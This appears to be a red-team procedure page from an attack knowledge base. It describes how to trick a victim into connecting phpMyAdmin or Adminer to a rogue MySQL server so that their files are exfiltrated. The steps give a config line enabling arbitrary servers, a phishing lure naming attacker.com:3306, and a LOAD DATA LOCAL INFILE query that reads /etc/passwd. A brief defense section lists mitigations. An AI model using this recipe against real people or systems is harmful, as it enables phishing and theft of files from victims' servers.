---
tags:
  - phishing
  - victim-trick
  - phpmyadmin
type: procedure
tools:
  - '[[tools/phpmyadmin]]'
  - '[[tools/adminer]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/load-data-local-infile-query]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Phishing]]'
updated_at: '2025-12-14T17:28:20.379Z'
sub_techniques: []
id: 48667ad4-e0e2-45f5-8eff-44d540c4f622
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Phishing]]'
---
# Trick Victim into Connecting to Rogue MySQL Server

## Summary

This procedure involves social engineering or misconfiguration exploitation to make a victim connect a vulnerable MySQL client (e.g., phpMyAdmin or Adminer) to the attacker's rogue server, triggering the file read.

## Description

Host the rogue server on an attacker-controlled machine (e.g., public IP). Identify victim systems with web-based MySQL admins like phpMyAdmin (AllowArbitraryServer enabled) or Adminer. Trick the victim via phishing email or direct link to enter the rogue server's details and execute a LOAD DATA query, causing their client to exfiltrate files.

## Requirements

1. Rogue server running and accessible
2. Victim using vulnerable client (PHP-based MySQL interfaces)
3. Social engineering vector (email, chat)

## Defense

Defensive measures and detection strategies:

- Disable arbitrary server connections in phpMyAdmin (AllowArbitraryServer=0)
- Train users on verifying server endpoints
- Log all outbound MySQL connections

## Objectives

1. Direct victim to rogue endpoint
2. Ensure query execution
3. Confirm connection

## Instructions

### Step 1: Prepare Victim Interface

**Context**: Ensure victim's phpMyAdmin or Adminer allows custom servers.

**Command**:
```php
// In config.inc.php: $cfg['AllowArbitraryServer'] = true;
```

> Restart web server if needed.

### Step 2: Lure Victim

**Context**: Send instructions to connect to rogue server (e.g., attacker.com:3306) and run query.

**Command** ([[commands/load-data-local-infile-query]]):
```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE pwn FIELDS TERMINATED BY '\n'
```

> Victim executes this in the interface.

### Step 3: Monitor Connection

**Context**: Watch rogue server for incoming connection.

**Command**:
```bash
tail -f rogue_server.log
```

> Look for authentication and query logs.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Phishing]]

### Sub-Techniques


## Commands Used

- [[commands/load-data-local-infile-query]]

## Tools Used

- [[tools/phpmyadmin]]
- [[tools/adminer]]

## Tags

- phishing
- victim-trick
- phpmyadmin
